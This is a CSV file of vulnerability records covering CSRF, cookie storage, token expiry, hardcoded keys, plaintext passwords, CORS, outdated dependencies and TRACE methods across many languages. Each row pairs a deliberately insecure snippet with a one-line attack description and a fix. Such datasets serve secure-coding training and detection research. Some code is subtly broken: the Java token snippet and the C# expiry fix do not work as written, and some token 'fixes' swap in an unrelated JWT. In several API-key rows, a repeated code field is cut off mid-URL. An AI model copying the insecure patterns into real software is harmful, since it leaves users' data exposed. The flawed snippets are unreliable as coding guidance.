vuln-884,Elixir,Insecure CSRF Token Handling,No CSRF protection on state-changing requests.,"post ""/update"", do: update_user(conn, params)",Forge requests to modify data.,Add CSRF: plug :protect_from_forgery,"post ""/update"", do: update_user(conn, params)",True,True,False,False,45,False,True,False,Authentication,1
vuln-885,Perl,Insecure CSRF Token Handling,Missing CSRF token validation.,my $user = $r->param('user'); update_user($user);,Perform unauthorized actions.,Validate CSRF: if (validate_csrf_token($r->param('csrf_token'))) { update_user(...) },my $user = $r->param('user'); update_user($user);,True,True,False,False,49,False,True,False,Authentication,1
vuln-886,Node.js,Insecure Session Storage,Storing sensitive data in client-side cookies.,"res.cookie('user_data', JSON.stringify({ id: user.id, role: user.role }));",Steal sensitive data from cookies.,"Store in server-side session: req.session.user = { id: user.id, role: user.role }","res.cookie('user_data', JSON.stringify({ id: user.id, role: user.role }));",False,False,False,False,74,False,True,False,Authentication,1
vuln-887,Python,Insecure Session Storage,Storing sensitive data in client-side cookies.,"response.set_cookie('user_data', json.dumps({'id': user.id, 'role': user.role}))",Access sensitive data via cookies.,"Use server-side session: session['user'] = {'id': user.id, 'role': user.role}","response.set_cookie('user_data', json.dumps({'id': user.id, 'role': user.role}))",False,False,False,False,80,False,True,False,Authentication,1
vuln-888,Java,Insecure Session Storage,Storing sensitive data in cookies.,"Cookie cookie = new Cookie(""user_data"", user.getId() + "":"" + user.getRole()); response.addCookie(cookie);",Steal sensitive data from cookies.,"Use HttpSession: session.setAttribute(""user"", user)","Cookie cookie = new Cookie(""user_data"", user.getId() + "":"" + user.getRole()); response.addCookie(cookie);",False,False,False,False,105,False,True,True,Authentication,1
vuln-889,PHP,Insecure Session Storage,Storing sensitive data in client-side cookies.,"setcookie('user_data', json_encode(['id' => $user['id'], 'role' => $user['role']]));",Access sensitive data via cookies.,"Use session: $_SESSION['user'] = ['id' => $user['id'], 'role' => $user['role']]","setcookie('user_data', json_encode(['id' => $user['id'], 'role' => $user['role']]));",False,False,False,False,84,False,True,False,Authentication,1
vuln-890,Ruby,Insecure Session Storage,Storing sensitive data in cookies.,"cookies[:user_data] = { id: user.id, role: user.role }.to_json",Steal sensitive data from cookies.,"Use session: session[:user] = { id: user.id, role: user.role }","cookies[:user_data] = { id: user.id, role: user.role }.to_json",False,False,False,False,62,False,False,False,Authentication,1
vuln-891,Go,Insecure Session Storage,Storing sensitive data in cookies.,"http.SetCookie(w, &http.Cookie{Name: ""user_data"", Value: fmt.Sprintf(""%d:%s"", user.ID, user.Role)})",Access sensitive data via cookies.,"Use session: session.Values[""user""] = user","http.SetCookie(w, &http.Cookie{Name: ""user_data"", Value: fmt.Sprintf(""%d:%s"", user.ID, user.Role)})",False,False,False,False,99,False,True,True,Authentication,1
vuln-892,C# (.NET),Insecure Session Storage,Storing sensitive data in cookies.,"Response.Cookies.Append(""user_data"", JsonSerializer.Serialize(new { user.Id, user.Role }));",Steal sensitive data from cookies.,"Use session: HttpContext.Session.SetString(""user"", JsonSerializer.Serialize(user))","Response.Cookies.Append(""user_data"", JsonSerializer.Serialize(new { user.Id, user.Role }));",False,False,False,False,91,False,True,False,Authentication,1
vuln-893,Kotlin,Insecure Session Storage,Storing sensitive data in client-side cookies.,"call.response.cookies.append(""user_data"", Json.encodeToString(User(id, role)))",Access sensitive data via cookies.,"Use session: call.sessions.set(UserSession(id, role))","call.response.cookies.append(""user_data"", Json.encodeToString(User(id, role)))",False,False,False,False,78,False,True,False,Authentication,1
vuln-894,Scala,Insecure Session Storage,Storing sensitive data in cookies.,"Ok.withCookies(Cookie(""user_data"", s""${user.id}:${user.role}""))",Steal sensitive data from cookies.,"Use session: Ok.withSession(""user"" -> Json.toJson(user).toString)","Ok.withCookies(Cookie(""user_data"", s""${user.id}:${user.role}""))",False,False,False,False,63,False,True,True,Authentication,1
vuln-895,Rust,Insecure Session Storage,Storing sensitive data in cookies.,"res.cookie(Cookie::new(""user_data"", format!(""{}:{}"", user.id, user.role)))",Access sensitive data via cookies.,"Use session: req.session()?.set(""user"", user)?","res.cookie(Cookie::new(""user_data"", format!(""{}:{}"", user.id, user.role)))",False,False,False,False,74,False,True,False,Authentication,1
vuln-896,Elixir,Insecure Session Storage,Storing sensitive data in client-side cookies.,"put_resp_cookie(conn, ""user_data"", %{id: user.id, role: user.role})",Steal sensitive data from cookies.,"Use session: put_session(conn, :user, %{id: user.id, role: user.role})","put_resp_cookie(conn, ""user_data"", %{id: user.id, role: user.role})",False,False,False,False,67,False,True,False,Authentication,1
vuln-897,Perl,Insecure Session Storage,Storing sensitive data in cookies.,"$r->headers_out->set('Set-Cookie' => ""user_data=$user->{id}:$user->{role}"");",Access sensitive data via cookies.,"Use session: $r->session->{user} = { id => $user->{id}, role => $user->{role} };","$r->headers_out->set('Set-Cookie' => ""user_data=$user->{id}:$user->{role}"");",False,False,False,False,76,False,True,False,Authentication,1
vuln-898,Node.js,Insecure Random Token Lifetime,Tokens with no or long expiration.,const token = crypto.randomBytes(32).toString('hex');,Reuse tokens indefinitely.,"Set expiry: jwt.sign({ exp: Math.floor(Date.now() / 1000) + 3600 }, secret)",const token = crypto.randomBytes(32).toString('hex');,False,False,False,False,53,False,True,False,Authentication,1
vuln-899,Python,Insecure Random Token Lifetime,Tokens without expiration.,token = secrets.token_hex(32),Use stolen tokens without time limit.,"Set expiry: jwt.encode({'exp': time.time() + 3600}, secret)",token = secrets.token_hex(32),False,False,False,False,29,False,False,False,Authentication,1
vuln-900,Java,Insecure Random Token Lifetime,Tokens with no expiration.,String token = new SecureRandom().nextBytes(new byte[32]).toString();,Reuse tokens indefinitely.,Set expiry: JWT.create().withExpiresAt(new Date(System.currentTimeMillis() + 3600000)).sign(Algorithm.HMAC256(secret)),String token = new SecureRandom().nextBytes(new byte[32]).toString();,False,False,False,False,69,False,False,False,Authentication,1
vuln-901,PHP,Insecure Random Token Lifetime,Tokens without expiration.,$token = bin2hex(random_bytes(32));,Reuse stolen tokens indefinitely.,"Set expiry: JWT::encode(['exp' => time() + 3600], $secret, 'HS256')",$token = bin2hex(random_bytes(32));,False,False,False,False,35,False,False,False,Authentication,1
vuln-902,Ruby,Insecure Random Token Lifetime,Tokens with no expiration.,token = SecureRandom.hex(32),Use stolen tokens without time limit.,"Set expiry: JWT.encode({ exp: Time.now.to_i + 3600 }, secret, 'HS256')",token = SecureRandom.hex(32),False,False,False,False,28,False,False,False,Authentication,1
vuln-903,Go,Insecure Random Token Lifetime,Tokens without expiration.,token := hex.EncodeToString(cryptoRand(32)),Reuse tokens indefinitely.,"Set expiry: jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{""exp"": time.Now().Add(time.Hour).Unix()}).SignedString(secret)",token := hex.EncodeToString(cryptoRand(32)),False,False,False,False,43,False,False,False,Authentication,1
vuln-904,C# (.NET),Insecure Random Token Lifetime,Tokens with no expiration.,var token = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));,Use stolen tokens without time limit.,"Set expiry: new JwtSecurityToken(claims: new[] { new Claim(""exp"", DateTime.UtcNow.AddHours(1).ToUnixTimeSeconds().ToString()) })",var token = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));,False,False,False,False,71,False,False,False,Authentication,1
vuln-905,Kotlin,Insecure Random Token Lifetime,Tokens without expiration.,val token = SecureRandom().nextBytes(32).toHex(),Reuse stolen tokens indefinitely.,Set expiry: JWT.create().withExpiresAt(Date(System.currentTimeMillis() + 3600000)).sign(Algorithm.HMAC256(secret)),val token = SecureRandom().nextBytes(32).toHex(),False,False,False,False,48,False,False,False,Authentication,1
vuln-906,Scala,Insecure Random Token Lifetime,Tokens with no expiration.,"val token = SecureRandom.getInstance(""SHA1PRNG"").nextBytes(32).toHex",Use stolen tokens without time limit.,Set expiry: JWT.create().withExpiresAt(new Date(System.currentTimeMillis() + 3600000)).sign(Algorithm.HMAC256(secret)),"val token = SecureRandom.getInstance(""SHA1PRNG"").nextBytes(32).toHex",False,False,False,False,68,False,True,False,Authentication,1
vuln-907,Rust,Insecure Random Token Lifetime,Tokens without expiration.,let token = hex::encode(rand::random::<[u8; 32]>());,Reuse stolen tokens indefinitely.,"Set expiry: jsonwebtoken::encode(&Header::default(), &Claims { exp: chrono::Utc::now().timestamp() + 3600 }, &secret)",let token = hex::encode(rand::random::<[u8; 32]>());,False,False,False,False,52,False,False,False,Authentication,1
vuln-908,Elixir,Insecure Random Token Lifetime,Tokens with no expiration.,token = :crypto.strong_rand_bytes(32) |> Base.encode16(),Use stolen tokens without time limit.,"Set expiry: Joken.generate_and_sign(%{exp: :os.system_time(:second) + 3600}, signer)",token = :crypto.strong_rand_bytes(32) |> Base.encode16(),False,False,False,False,56,False,False,False,Authentication,1
vuln-909,Perl,Insecure Random Token Lifetime,Tokens without expiration.,"my $token = unpack('H*', Crypt::Random::Source::random_bytes(32));",Reuse stolen tokens indefinitely.,"Set expiry: JWT::encode({ exp => time() + 3600 }, $secret, 'HS256')","my $token = unpack('H*', Crypt::Random::Source::random_bytes(32));",False,False,False,False,66,False,True,False,Authentication,1
vuln-910,Node.js,Insecure API Key Exposure,Hardcoded API keys in source code.,"const apiKey = 'sk_1234567890'; axios.get('https://api.example.com', { headers: { Authorization: apiKey } });",Extract API keys from source code or logs.,Use env: const apiKey = process.env.API_KEY;,const apiKey = 'sk_1234567890'; axios.get('https:,False,False,False,False,109,False,True,False,Other,1
vuln-911,Python,Insecure API Key Exposure,Hardcoded API keys in code.,"api_key = 'sk_1234567890'; requests.get('https://api.example.com', headers={'Authorization': api_key})",Steal API keys from code or logs.,Use env: api_key = os.getenv('API_KEY'),api_key = 'sk_1234567890'; requests.get('https:,False,False,False,False,102,False,True,False,Other,1
vuln-912,Java,Insecure API Key Exposure,Hardcoded API keys in source code.,"String apiKey = ""sk_1234567890""; HttpClient.newHttpClient().send(HttpRequest.newBuilder().uri(URI.create(""https://api.example.com"")).header(""Authorization"", apiKey).build(), ...);",Extract API keys from source.,"Use env: String apiKey = System.getenv(""API_KEY"")","String apiKey = ""sk_1234567890""; HttpClient.newHttpClient().send(HttpRequest.newBuilder().uri(URI.create(""https:",False,False,False,False,179,False,True,False,Other,1
vuln-913,PHP,Insecure API Key Exposure,Hardcoded API keys in code.,"$api_key = 'sk_1234567890'; curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: ' . $api_key]);",Steal API keys from source code.,Use env: $api_key = getenv('API_KEY'),"$api_key = 'sk_1234567890'; curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: ' . $api_key]);",False,False,False,False,97,False,True,False,Other,1
vuln-914,Ruby,Insecure API Key Exposure,Hardcoded API keys in code.,"api_key = 'sk_1234567890'; HTTParty.get('https://api.example.com', headers: { 'Authorization' => api_key })",Extract API keys from code.,Use env: api_key = ENV['API_KEY'],api_key = 'sk_1234567890'; HTTParty.get('https:,False,False,False,False,107,False,True,False,Other,1
vuln-915,Go,Insecure API Key Exposure,Hardcoded API keys in source code.,"apiKey := ""sk_1234567890""; req, _ := http.NewRequest(""GET"", ""https://api.example.com"", nil); req.Header.Set(""Authorization"", apiKey)",Steal API keys from source.,"Use env: apiKey := os.Getenv(""API_KEY"")","apiKey := ""sk_1234567890""; req, _ := http.NewRequest(""GET"", ""https:",True,False,False,False,132,False,True,False,Other,1
vuln-916,C# (.NET),Insecure API Key Exposure,Hardcoded API keys in code.,"string apiKey = ""sk_1234567890""; httpClient.DefaultRequestHeaders.Add(""Authorization"", apiKey);",Extract API keys from source code.,"Use env: string apiKey = Environment.GetEnvironmentVariable(""API_KEY"")","string apiKey = ""sk_1234567890""; httpClient.DefaultRequestHeaders.Add(""Authorization"", apiKey);",False,False,False,False,95,False,True,False,Other,1
vuln-917,Kotlin,Insecure API Key Exposure,Hardcoded API keys in source code.,"val apiKey = ""sk_1234567890""; http.get(""https://api.example.com"") { header(""Authorization"", apiKey) }",Steal API keys from code.,"Use env: val apiKey = System.getenv(""API_KEY"")","val apiKey = ""sk_1234567890""; http.get(""https:",False,False,False,False,101,False,True,False,Other,1
vuln-918,Scala,Insecure API Key Exposure,Hardcoded API keys in code.,"val apiKey = ""sk_1234567890""; WS.url(""https://api.example.com"").withHeaders(""Authorization"" -> apiKey).get()",Extract API keys from source.,"Use env: val apiKey = sys.env(""API_KEY"")","val apiKey = ""sk_1234567890""; WS.url(""https:",False,False,False,False,108,False,True,False,Other,1
vuln-919,Rust,Insecure API Key Exposure,Hardcoded API keys in source code.,"let api_key = ""sk_1234567890""; reqwest::Client::new().get(""https://api.example.com"").header(""Authorization"", api_key).send()?",Steal API keys from code.,"Use env: let api_key = env::var(""API_KEY"")?","let api_key = ""sk_1234567890""; reqwest::Client::new().get(""https:",False,False,False,False,125,False,True,False,Other,1
vuln-920,Elixir,Insecure API Key Exposure,Hardcoded API keys in code.,"api_key = ""sk_1234567890""; HTTPoison.get(""https://api.example.com"", [{""Authorization"", api_key}])",Extract API keys from source.,"Use env: api_key = System.get_env(""API_KEY"")","api_key = ""sk_1234567890""; HTTPoison.get(""https:",False,False,False,False,97,False,True,False,Other,1
vuln-921,Perl,Insecure API Key Exposure,Hardcoded API keys in code.,"my $api_key = 'sk_1234567890'; $ua->get('https://api.example.com', Authorization => $api_key);",Steal API keys from source code.,Use env: my $api_key = $ENV{'API_KEY'},my $api_key = 'sk_1234567890'; $ua->get('https:,False,False,False,False,94,False,True,False,Other,1
vuln-922,Node.js,Insecure Password Storage,Storing passwords in plain text.,user.password = req.body.password; db.save(user);,Steal passwords from database breaches.,"Hash passwords: user.password = bcrypt.hashSync(req.body.password, 10)",user.password = req.body.password; db.save(user);,True,False,False,False,49,False,False,False,Other,1
vuln-923,Python,Insecure Password Storage,Storing plain text passwords.,user['password'] = request.form['password']; db.save(user),Extract passwords from database.,"Hash: user['password'] = bcrypt.hashpw(request.form['password'].encode(), bcrypt.gensalt())",user['password'] = request.form['password']; db.save(user),False,False,False,False,58,False,True,False,Other,1
vuln-924,Java,Insecure Password Storage,Storing passwords in plain text.,"user.setPassword(request.getParameter(""password"")); userRepo.save(user);",Steal passwords from database.,"Hash: user.setPassword(BCrypt.hashpw(request.getParameter(""password""), BCrypt.gensalt()))","user.setPassword(request.getParameter(""password"")); userRepo.save(user);",True,False,False,False,72,False,True,False,Other,1
vuln-925,PHP,Insecure Password Storage,Storing plain text passwords.,$user['password'] = $_POST['password']; save_user($user);,Extract passwords from database breaches.,"Hash: $user['password'] = password_hash($_POST['password'], PASSWORD_BCRYPT)",$user['password'] = $_POST['password']; save_user($user);,False,False,False,False,57,False,True,False,Other,1
vuln-926,Ruby,Insecure Password Storage,Storing passwords in plain text.,user.password = params[:password]; user.save,Steal passwords from database.,Hash: user.password = BCrypt::Password.create(params[:password]),user.password = params[:password]; user.save,True,False,False,False,44,False,False,False,Other,1
vuln-927,Go,Insecure Password Storage,Storing plain text passwords.,"user.Password = r.FormValue(""password""); db.Save(user)",Extract passwords from database.,"Hash: user.Password = bcrypt.GenerateFromPassword([]byte(r.FormValue(""password"")), bcrypt.DefaultCost)","user.Password = r.FormValue(""password""); db.Save(user)",False,False,False,False,54,False,True,False,Other,1
vuln-928,C# (.NET),Insecure Password Storage,Storing passwords in plain text.,user.Password = model.Password; db.Save(user);,Steal passwords from database breaches.,Hash: user.Password = BCrypt.Net.BCrypt.HashPassword(model.Password),user.Password = model.Password; db.Save(user);,False,False,False,False,46,False,False,False,Other,1
vuln-929,Kotlin,Insecure Password Storage,Storing plain text passwords.,"user.password = call.parameters[""password""]!!; userRepo.save(user)",Extract passwords from database.,"Hash: user.password = BCrypt.hashpw(call.parameters[""password""]!!, BCrypt.gensalt())","user.password = call.parameters[""password""]!!; userRepo.save(user)",True,False,False,False,66,False,True,False,Other,1
vuln-930,Scala,Insecure Password Storage,Storing passwords in plain text.,"user.password = params(""password""); userRepo.save(user)",Steal passwords from database.,"Hash: user.password = BCrypt.hashpw(params(""password""), BCrypt.gensalt())","user.password = params(""password""); userRepo.save(user)",True,False,False,False,55,False,True,False,Other,1
vuln-931,Rust,Insecure Password Storage,Storing plain text passwords.,user.password = req.form::<User>().await?.password; db.save(user)?;,Extract passwords from database breaches.,"Hash: user.password = bcrypt::hash(req.form::<User>().await?.password, DEFAULT_COST)?",user.password = req.form::<User>().await?.password; db.save(user)?;,True,False,False,False,67,False,False,False,Other,1
vuln-932,Elixir,Insecure Password Storage,Storing plain text passwords.,"user = %{password: params[""password""]}; Repo.insert(user)",Steal passwords from database.,"Hash: user = %{password: Bcrypt.hash_pwd_salt(params[""password""])}; Repo.insert(user)","user = %{password: params[""password""]}; Repo.insert(user)",True,True,False,False,57,False,True,False,Other,1
vuln-933,Perl,Insecure Password Storage,Storing passwords in plain text.,my $user = { password => $r->param('password') }; save_user($user);,Extract passwords from database.,"Hash: my $user = { password => Crypt::BCrypt::bcrypt($r->param('password'), '2a', 12) };",my $user = { password => $r->param('password') }; save_user($user);,True,False,False,False,67,False,True,False,Other,1
vuln-934,Node.js,Insecure CORS Configuration,Overly permissive CORS policy.,app.use(cors({ origin: '*' }));,Unauthorized cross-origin requests.,Restrict: cors({ origin: 'https://trusted.com' }),app.use(cors({ origin: '*' }));,False,False,False,False,31,False,True,False,Configuration,1
vuln-935,Python,Insecure CORS Configuration,Allowing all origins in CORS.,"app = Flask(__name__); CORS(app, resources={r""/*"": {""origins"": ""*""}})",Perform unauthorized cross-origin requests.,"Restrict: CORS(app, resources={r""/*"": {""origins"": ""https://trusted.com""}})","app = Flask(__name__); CORS(app, resources={r""/*"": {""origins"": ""*""}})",False,False,False,False,69,False,True,False,Configuration,1
vuln-936,Java,Insecure CORS Configuration,Overly permissive CORS settings.,"@CrossOrigin(origins = ""*"") @GetMapping(""/data"") public Data getData() { ... }",Unauthorized cross-origin access.,"Restrict: @CrossOrigin(origins = ""https://trusted.com"")","@CrossOrigin(origins = ""*"") @GetMapping(""/data"") public Data getData() { ... }",False,False,False,False,78,False,True,False,Configuration,1
vuln-937,PHP,Insecure CORS Configuration,Allowing all origins in CORS.,header('Access-Control-Allow-Origin: *');,Perform unauthorized cross-origin requests.,Restrict: header('Access-Control-Allow-Origin: https://trusted.com');,header('Access-Control-Allow-Origin: *');,False,False,False,False,41,False,True,False,Configuration,1
vuln-938,Ruby,Insecure CORS Configuration,Overly permissive CORS policy.,headers['Access-Control-Allow-Origin'] = '*',Unauthorized cross-origin requests.,Restrict: headers['Access-Control-Allow-Origin'] = 'https://trusted.com',headers['Access-Control-Allow-Origin'] = '*',False,False,False,False,44,False,True,False,Configuration,1
vuln-939,Go,Insecure CORS Configuration,Allowing all origins in CORS.,"w.Header().Set(""Access-Control-Allow-Origin"", ""*"")",Perform unauthorized cross-origin requests.,"Restrict: w.Header().Set(""Access-Control-Allow-Origin"", ""https://trusted.com"")","w.Header().Set(""Access-Control-Allow-Origin"", ""*"")",False,False,False,False,50,False,True,False,Configuration,1
vuln-940,C# (.NET),Insecure CORS Configuration,Overly permissive CORS settings.,"services.AddCors(options => options.AddPolicy(""AllowAll"", builder => builder.AllowAnyOrigin()));",Unauthorized cross-origin access.,"Restrict: builder.WithOrigins(""https://trusted.com"")","services.AddCors(options => options.AddPolicy(""AllowAll"", builder => builder.AllowAnyOrigin()));",False,False,False,False,96,False,True,False,Configuration,1
vuln-941,Kotlin,Insecure CORS Configuration,Allowing all origins in CORS.,install(CORS) { anyHost() },Perform unauthorized cross-origin requests.,"Restrict: install(CORS) { host(""trusted.com"", schemes = listOf(""https"")) }",install(CORS) { anyHost() },False,False,False,False,27,False,False,False,Configuration,1
vuln-942,Scala,Insecure CORS Configuration,Overly permissive CORS policy.,"Ok().withHeaders(""Access-Control-Allow-Origin"" -> ""*"")",Unauthorized cross-origin requests.,"Restrict: Ok().withHeaders(""Access-Control-Allow-Origin"" -> ""https://trusted.com"")","Ok().withHeaders(""Access-Control-Allow-Origin"" -> ""*"")",False,False,False,False,54,False,True,False,Configuration,1
vuln-943,Rust,Insecure CORS Configuration,Allowing all origins in CORS.,"res.header(""Access-Control-Allow-Origin"", ""*"")",Perform unauthorized cross-origin requests.,"Restrict: res.header(""Access-Control-Allow-Origin"", ""https://trusted.com"")","res.header(""Access-Control-Allow-Origin"", ""*"")",False,False,False,False,46,False,True,False,Configuration,1
vuln-944,Elixir,Insecure CORS Configuration,Overly permissive CORS settings.,"plug CORSPlug, origin: ""*""",Unauthorized cross-origin access.,"Restrict: plug CORSPlug, origin: ""https://trusted.com""","plug CORSPlug, origin: ""*""",False,False,False,False,26,False,True,False,Configuration,1
vuln-945,Perl,Insecure CORS Configuration,Allowing all origins in CORS.,$r->headers_out->set('Access-Control-Allow-Origin' => '*');,Perform unauthorized cross-origin requests.,Restrict: $r->headers_out->set('Access-Control-Allow-Origin' => 'https://trusted.com');,$r->headers_out->set('Access-Control-Allow-Origin' => '*');,False,False,False,False,59,False,True,False,Configuration,1
vuln-946,Node.js,Insecure Dependency Management,Using outdated or vulnerable dependencies.,"""dependencies"": { ""lodash"": ""^4.17.15"" }",Exploit known vulnerabilities in old packages.,"Update: ""lodash"": ""^4.17.21"" and use npm audit","""dependencies"": { ""lodash"": ""^4.17.15"" }",False,False,False,False,40,False,True,False,Other,1
vuln-947,Python,Insecure Dependency Management,Using outdated dependencies with known vulnerabilities.,requirements.txt: requests==2.22.0,Exploit known package vulnerabilities.,Update: requests>=2.31.0 and use pip-audit,requirements.txt: requests==2.22.0,False,False,False,False,34,False,False,False,Other,1
vuln-948,Java,Insecure Dependency Management,Using vulnerable library versions.,<dependency><groupId>com.fasterxml.jackson.core</groupId><artifactId>jackson-databind</artifactId><version>2.9.8</version></dependency>,Exploit known vulnerabilities in old libraries.,Update: <version>2.15.2</version> and use dependency-check,<dependency><groupId>com.fasterxml.jackson.core</groupId><artifactId>jackson-databind</artifactId><version>2.9.8</version></dependency>,False,False,False,False,135,False,False,False,Other,1
vuln-949,PHP,Insecure Dependency Management,Using outdated composer packages.,"""require"": { ""monolog/monolog"": ""1.25.0"" }",Exploit known package vulnerabilities.,"Update: ""monolog/monolog"": ""^2.9.1"" and use composer audit","""require"": { ""monolog/monolog"": ""1.25.0"" }",False,False,False,False,42,False,True,False,Other,1
vuln-950,Ruby,Insecure Dependency Management,Using vulnerable gem versions.,"gem 'rails', '5.2.3'",Exploit known vulnerabilities in gems.,"Update: gem 'rails', '~> 7.0.8' and use bundle-audit","gem 'rails', '5.2.3'",False,False,False,False,20,False,True,False,Other,1
vuln-951,Go,Insecure Dependency Management,Using outdated Go modules.,require github.com/gin-gonic/gin v1.6.3,Exploit known module vulnerabilities.,Update: require github.com/gin-gonic/gin v1.9.1 and use govulncheck,require github.com/gin-gonic/gin v1.6.3,False,False,False,False,39,False,False,False,Other,1
vuln-952,C# (.NET),Insecure Dependency Management,Using outdated NuGet packages.,"<PackageReference Include=""Newtonsoft.Json"" Version=""12.0.1"" />",Exploit known package vulnerabilities.,"Update: <PackageReference Include=""Newtonsoft.Json"" Version=""13.0.3"" /> and use dotnet list package --vulnerable","<PackageReference Include=""Newtonsoft.Json"" Version=""12.0.1"" />",False,False,False,False,63,False,True,False,Other,1
vuln-953,Kotlin,Insecure Dependency Management,Using vulnerable Gradle dependencies.,implementation 'com.fasterxml.jackson.core:jackson-databind:2.9.8',Exploit known vulnerabilities in libraries.,Update: implementation 'com.fasterxml.jackson.core:jackson-databind:2.15.2' and use dependencyCheck,implementation 'com.fasterxml.jackson.core:jackson-databind:2.9.8',False,False,False,False,66,False,True,False,Other,1
vuln-954,Scala,Insecure Dependency Management,Using outdated SBT dependencies.,"libraryDependencies += ""com.fasterxml.jackson.core"" % ""jackson-databind"" % ""2.9.8""",Exploit known library vulnerabilities.,"Update: libraryDependencies += ""com.fasterxml.jackson.core"" % ""jackson-databind"" % ""2.15.2"" and use sbt-dependency-check","libraryDependencies += ""com.fasterxml.jackson.core"" % ""jackson-databind"" % ""2.9.8""",False,False,False,False,82,False,True,True,Other,1
vuln-955,Rust,Insecure Dependency Management,Using vulnerable Cargo dependencies.,"[dependencies] serde = ""1.0.104""",Exploit known vulnerabilities in crates.,"Update: serde = ""1.0.204"" and use cargo-audit","[dependencies] serde = ""1.0.104""",False,False,False,False,32,False,True,False,Other,1
vuln-956,Elixir,Insecure Dependency Management,Using outdated Hex packages.,"{:phoenix, ""~> 1.5.3""}",Exploit known package vulnerabilities.,"Update: {:phoenix, ""~> 1.7.14""} and use mix hex.audit","{:phoenix, ""~> 1.5.3""}",False,False,False,False,22,False,True,False,Other,1
vuln-957,Perl,Insecure Dependency Management,Using outdated CPAN modules.,use LWP::UserAgent 5.837;,Exploit known module vulnerabilities.,Update: use LWP::UserAgent 6.77; and check CPAN for vulnerabilities,use LWP::UserAgent 5.837;,False,False,False,False,25,False,False,False,Other,1
vuln-958,Node.js,Insecure HTTP Methods,Allowing unsafe HTTP methods like TRACE.,"app.all('/endpoint', handler);",Use TRACE for cross-site tracing attacks.,"Restrict: app.use((req, res, next) => { if (req.method === 'TRACE') res.status(405).end(); else next(); })","app.all('/endpoint', handler);",False,False,False,False,30,False,True,False,Other,1
vuln-959,Python,Insecure HTTP Methods,Allowing unsafe HTTP methods.,"@app.route('/endpoint', methods=['GET', 'POST', 'TRACE'])",Exploit TRACE for XST attacks.,"Restrict: @app.route('/endpoint', methods=['GET', 'POST'])","@app.route('/endpoint', methods=['GET', 'POST', 'TRACE'])",False,False,False,False,57,False,True,False,Other,1
vuln-960,Java,Insecure HTTP Methods,Allowing unsafe HTTP methods like TRACE.,"@RequestMapping(value = ""/endpoint"", method = {RequestMethod.GET, RequestMethod.POST, RequestMethod.TRACE})",Use TRACE for cross-site tracing.,"Restrict: method = {RequestMethod.GET, RequestMethod.POST}","@RequestMapping(value = ""/endpoint"", method = {RequestMethod.GET, RequestMethod.POST, RequestMethod.TRACE})",False,False,False,False,107,False,True,False,Other,1
vuln-961,PHP,Insecure HTTP Methods,Allowing unsafe HTTP methods.,if ($_SERVER['REQUEST_METHOD'] === 'GET' || $_SERVER['REQUEST_METHOD'] === 'POST' || $_SERVER['REQUEST_METHOD'] === 'TRACE') { handle_request(); },Exploit TRACE for XST attacks.,Restrict: if ($_SERVER['REQUEST_METHOD'] === 'GET' || $_SERVER['REQUEST_METHOD'] === 'POST') { handle_request(); },if ($_SERVER['REQUEST_METHOD'] === 'GET' || $_SERVER['REQUEST_METHOD'] === 'POST' || $_SERVER['REQUEST_METHOD'] === 'TRACE') { handle_request(); },False,False,False,False,146,False,True,False,Other,1
vuln-962,Ruby,Insecure HTTP Methods,Allowing unsafe HTTP methods like TRACE.,"match '/endpoint', to: 'controller#action', via: [:get, :post, :trace]",Use TRACE for cross-site tracing.,"Restrict: via: [:get, :post]","match '/endpoint', to: 'controller#action', via: [:get, :post, :trace]",False,False,False,False,70,False,True,False,Other,1
vuln-963,Go,Insecure HTTP Methods,Allowing unsafe HTTP methods.,"http.HandleFunc(""/endpoint"", func(w http.ResponseWriter, r *http.Request) { if r.Method == ""TRACE"" || r.Method == ""GET"" || r.Method == ""POST"" { ... } })",Exploit TRACE for XST attacks.,"Restrict: if r.Method == ""GET"" || r.Method == ""POST"" { ... }","http.HandleFunc(""/endpoint"", func(w http.ResponseWriter, r *http.Request) { if r.Method == ""TRACE"" || r.Method == ""GET"" || r.Method == ""POST"" { ... } })",False,False,False,False,152,False,True,False,Other,1
vuln-964,C# (.NET),Insecure HTTP Methods,Allowing unsafe HTTP methods like TRACE.,"[AcceptVerbs(""GET"", ""POST"", ""TRACE"")] public IActionResult Endpoint() { ... }",Use TRACE for cross-site tracing.,"Restrict: [AcceptVerbs(""GET"", ""POST"")]","[AcceptVerbs(""GET"", ""POST"", ""TRACE"")] public IActionResult Endpoint() { ... }",False,False,False,False,77,False,True,False,Other,1
vuln-965,Kotlin,Insecure HTTP Methods,Allowing unsafe HTTP methods.,"route(""/endpoint"") { get { ... } post { ... } trace { ... } }",Exploit TRACE for XST attacks.,"Restrict: route(""/endpoint"") { get { ... } post { ... } }","route(""/endpoint"") { get { ... } post { ... } trace { ... } }",False,False,False,False,61,False,True,False,Other,1
vuln-966,Scala,Insecure HTTP Methods,Allowing unsafe HTTP methods like TRACE.,"path(""endpoint"") { get { ... } ~ post { ... } ~ trace { ... } }",Use TRACE for cross-site tracing.,"Restrict: path(""endpoint"") { get { ... } ~ post { ... } }","path(""endpoint"") { get { ... } ~ post { ... } ~ trace { ... } }",False,False,False,False,63,False,True,False,Other,1
vuln-967,Rust,Insecure HTTP Methods,Allowing unsafe HTTP methods.,"router.any(""/endpoint"", |req, res| { if req.method() == Method::TRACE { ... } })",Exploit TRACE for XST attacks.,"Restrict: router.route(""/endpoint"", get(|_, res| ...).post(|_, res| ...))","router.any(""/endpoint"", |req, res| { if req.method() == Method::TRACE { ... } })",True,False,False,False,80,False,True,False,Other,1
vuln-968,Elixir,Insecure HTTP Methods,Allowing unsafe HTTP methods like TRACE.,"match :*, ""/endpoint"", fn conn -> handle_request(conn) end",Use TRACE for cross-site tracing.,"Restrict: get ""/endpoint"", do: handle_request(conn); post ""/endpoint"", do: handle_request(conn)","match :*, ""/endpoint"", fn conn -> handle_request(conn) end",False,False,False,False,58,False,True,False,Other,1
vuln-969,Perl,Insecure HTTP Methods,Allowing unsafe HTTP methods.,if ($r->method eq 'GET' || $r->method eq 'POST' || $r->method eq 'TRACE') { handle_request() },Exploit TRACE for XST attacks.,Restrict: if ($r->method eq 'GET' || $r->method eq 'POST') { handle_request() },if ($r->method eq 'GET' || $r->method eq 'POST' || $r->method eq 'TRACE') { handle_request() },False,False,False,False,94,False,True,False,Other,1
